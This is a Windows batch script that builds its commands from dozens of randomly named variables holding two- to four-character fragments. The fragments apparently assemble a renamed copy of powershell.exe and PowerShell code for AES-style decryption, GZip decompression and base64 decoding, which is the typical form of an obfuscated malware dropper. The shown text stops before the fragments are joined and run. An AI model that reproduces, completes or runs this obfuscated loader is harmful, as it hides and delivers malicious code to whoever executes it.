@echo off
set "XNKRqNPXFe=ll"
set "aLclYvddWG=\W"
set "BQUjFZCDns=ws"
set "jmdePnocZg=ll"
set "dnajuAYVAv=.e"
set "HLCkFsUKHO=in"
set "UHQUNWsnjA=py"
set "zyJHvzZARG=st"
set "kwLFXNYiGI=32"
set "ZEzXzxQCXV=nd"
set "wUEHaKKkRx=ow"
set "hGITMvWoyR=0\"
set "wbQxYOgUGp=rs"
set "UMKsgHmuQr=s\"
set "BOtzjZDdDv=po"
set "SnBRjyENPV=we"
set "yChpvcNdJI=do"
set "BWzyrJrYhl= /"
set "XIWvbsJZhG=Sy"
set "ZipBlZhoUr=y "
set "luRKoIsJoo=we"
set "PrwoEIrXeW=he"
set "jQlkkzTAZF=Po"
set "IAUuQBRnmB=1."
set "WjWGdqbGCR=:\"
set "LFOmOmThRS=em"
set "IatofQQtFF=rS"
set "lunhNNoGfa= C"
set "mhyoSUhvkQ=he"
set "ReJLJKBKHX=co"
set "TJxojdVCSu=xe"
set "uEiSqwPFKJ=Wi"
set "vPNsKjwWft=\v"
set "DDMmedaOro=cd"
set "ITWIGqWXZq= %~dp0"
set "AzUKTgVQaD=7kGw"
set "WbJkYnySID=, $H"
set "ftHngGJVuY=comp"
set "BhNGWMwdhk=Ls.T"
set "THqBOddOet=kdsR"
set "GzjIiDaSsl=, (,"
set "zWVfJYPltM=pPQk"
set "gFXVzyuazC=LrlC"
set "NkAHHBpQsZ=;$dG"
set "nvaykULUii=.Dis"
set "pAwIsoladr=.GZi"
set "WuuQgaotNF=Secu"
set "lLBFygdpRM=yTo("
set "ZZdugMedNC=V = "
set "NKezViDDzn=tryP"
set "kkZhNuLJDO=e]::"
set "FxNlgFcKzK=se()"
set "EvPfpZYuBt=GwaM"
set "vlFhdywUVj=mory"
set "APkpsKIJNt=y.Ci"
set "vQGmxahDPo=saBm"
set "iJnHBRkmOf===')"
set "OFAIgrFsHD= [st"
set "syRnMkEgQH=kdsR"
set "ZWFQEnmqQk=k = "
set "smRUuDOhGg=kyhK"
set "xkMUwobPqU=ddin"
set "zvPCSBXLEL=ypto"
set "tXFulyEvnD=i.Su"
set "RcSAxQoBtY=th('"
set "uaNfOlhvFO=.Len"
set "nrAmjMTdCH=y.Cr"
set "oEIKGDwvyZ=le  "
set "kORbshBHzl=ptog"
set "moIAOQxUoN=ose("
set "XrvXxugpqa='[-1"
set "kdOZlmmQoc=oArr"
set "WYAETnlEhc=kdsR"
set "TgctHGLxDi=brea"
set "glvgURsTCq=-joi"
set "OLhzWgAgZP=$uOe"
set "eKdboJZmut=);$r"
set "OCAOBoGART= '')"
set "EkMqNRAMuT=ct S"
